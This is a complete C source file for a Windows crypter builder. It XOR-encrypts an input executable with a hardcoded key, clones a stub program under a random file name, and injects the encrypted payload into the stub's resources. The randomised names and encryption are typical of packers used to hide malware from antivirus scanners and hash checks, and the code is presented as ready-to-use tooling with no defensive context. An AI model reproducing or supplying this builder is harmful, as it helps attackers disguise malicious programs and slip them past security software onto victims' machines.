#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "crypto.h" // Ensure you have this or include the xor function here

// MATCH THIS WITH YOUR stub/resource.h!
#define IDR_RCDATA1 101 

// Helper: Generate Random String
void GenRandomString(char* s, const int len) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < len; ++i) {
        s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }
    s[len] = 0;
}

int main() {
    srand((unsigned)time(NULL));

    const char* inputFileName = "original.exe";
    const char* stubFileName = "Stub.exe"; // The clean, compiled stub
    char outputFileName[32];
    char key[] = "mysecretkey";

    // 1. Generate Random Filename
    char randName[10];
    GenRandomString(randName, 8);
    sprintf(outputFileName, "%s.exe", randName);
    printf("[*] Generated Output Name: %s\n", outputFileName);

    // 2. Read & Encrypt Payload
    printf("[*] Reading %s...\n", inputFileName);
    FILE* inFile = fopen(inputFileName, "rb");
    if (!inFile) { printf("[-] Error opening original.exe\n"); return 1; }

    fseek(inFile, 0, SEEK_END);
    long fileSize = ftell(inFile);
    fseek(inFile, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    fread(buffer, 1, fileSize, inFile);
    fclose(inFile);

    printf("[*] Encrypting Payload (%ld bytes)...\n", fileSize);
    XorCipher(buffer, fileSize, key, strlen(key));

    // 3. Create the New File from the Stub Template
    printf("[*] Cloning %s to %s...\n", stubFileName, outputFileName);
    if (!CopyFileA(stubFileName, outputFileName, FALSE)) {
        printf("[-] Failed to copy Stub.exe! Make sure it is in the same folder.\n");
        free(buffer);
        return 1;
    }

    // 4. Inject Payload into Resources
    printf("[*] Injecting Payload into Resources...\n");
    HANDLE hUpdate = BeginUpdateResourceA(outputFileName, FALSE);
    if (hUpdate == NULL) {
        printf("[-] BeginUpdateResource failed! Error: %d\n", GetLastError());
        free(buffer);
        return 1;
    }

    // Update the resource (RT_RCDATA, ID 101)
    if (!UpdateResourceA(hUpdate, RT_RCDATA, MAKEINTRESOURCEA(IDR_RCDATA1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        printf("[-] UpdateResource failed! Error: %d\n", GetLastError());
        free(buffer);
        return 1;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) { // FALSE = Write changes
        printf("[-] EndUpdateResource failed! Error: %d\n", GetLastError());
        free(buffer);
        return 1;
    }

    printf("[+] SUCCESS! Created %s with embedded payload.\n", outputFileName);

    // Optional: Calculate and print new hash here if you want
    free(buffer);
    return 0;
}